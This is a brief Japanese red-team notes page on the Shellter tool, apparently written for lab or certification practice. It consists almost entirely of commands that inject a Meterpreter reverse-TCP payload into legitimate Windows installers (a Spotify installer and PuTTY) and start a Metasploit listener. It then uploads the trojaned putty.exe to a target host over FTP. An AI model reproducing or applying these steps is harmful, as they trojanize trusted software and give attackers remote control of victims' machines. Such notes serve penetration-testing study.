---
title: Shellter
parent: Weaponization
grand_parent: Red Team
---

# インストール

```bash
apt-cache search shellter
shellter - Dynamic shellcode injection tool and dynamic PE infector
sudo apt install shellter
shellter
```

インジェクション用のファイル（SpotifyのWindows 32ビット版試用版実行インストーラー）をインストール

```bash
#以下からDL
https://sites.google.com/view/serialtips/home/spotify
```

Shellterを使ったPEファイルへのインジェクション

```shellter
A
/home/kali/Downloads/SpotifyFullWin10-32bit.exe
Y
L
192168.45.167
443

# 終了後ターゲットへ送信
```

# Listenerの起動

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.167;set LPORT 443;run;"
```

送信後、スクリプトを実行しmeterpreterセッションが張られることを確認

# 例1

```bash
# インジェクションする一般的なexeのDL
wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe

shellter
A
Y
L
1
192.168.45.167
443
Enter
```

```bash
#　待ち受け
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.167;set LPORT 443;run;"
```

```bash
#　Upload
ftp 192.168.220.53 -A
bin
put ./putty.exe
```
